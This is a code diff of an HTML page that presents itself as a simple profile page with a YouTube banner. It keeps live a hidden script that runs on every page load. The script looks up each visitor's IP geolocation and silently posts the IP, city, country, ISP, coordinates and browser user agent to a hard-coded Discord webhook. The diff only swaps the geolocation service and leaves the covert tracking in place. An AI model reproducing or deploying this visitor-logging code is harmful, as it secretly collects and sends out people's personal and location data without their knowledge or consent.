@@ -22,31 +22,31 @@
   <h2>@Gojosatoru01Stendoff</h2>
   <img src="https://i.imgur.com/zDKrSmT.png" alt="YouTube Banner">
 
-  <script>
-    const webhookUrl = "https://discord.com/api/webhooks/1390405581944127671/3-ALzQKMGdvacD-RqHM46ehF0cQyo0eb36yJ-Y_NkUv3DWcCJwzss3rG4Hu8j88JjjGZ";
+ <script>
+  const webhookUrl = "https://discord.com/api/webhooks/1390405581944127671/3-ALzQKMGdvacD-RqHM46ehF0cQyo0eb36yJ-Y_NkUv3DWcCJwzss3rG4Hu8j88JjjGZ";
 
-    fetch('https://ipinfo.io/json?token=41e83b3f1c85c6')
-      .then(response => response.json())
-      .then(data => {
-        const message = {
-          content: `🔎 **Новый гость на сайте!**
+  fetch('https://ipapi.co/json/')
+    .then(response => response.json())
+    .then(data => {
+      const message = {
+        content: `🔎 **Новый гость на сайте!**
 **IP:** ${data.ip}
-**Страна:** ${data.country}
+**Страна:** ${data.country_name}
 **Город:** ${data.city}
 **Провайдер:** ${data.org}
-**Локация:** ${data.loc}
+**Локация:** ${data.latitude}, ${data.longitude}
 **Устройство:** ${navigator.userAgent}`
-        };
+      };
 
-        fetch(webhookUrl, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify(message)
-        });
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(message)
       });
-  </script>
-
+    });
+ </script>
+  
 </body>
 </html>
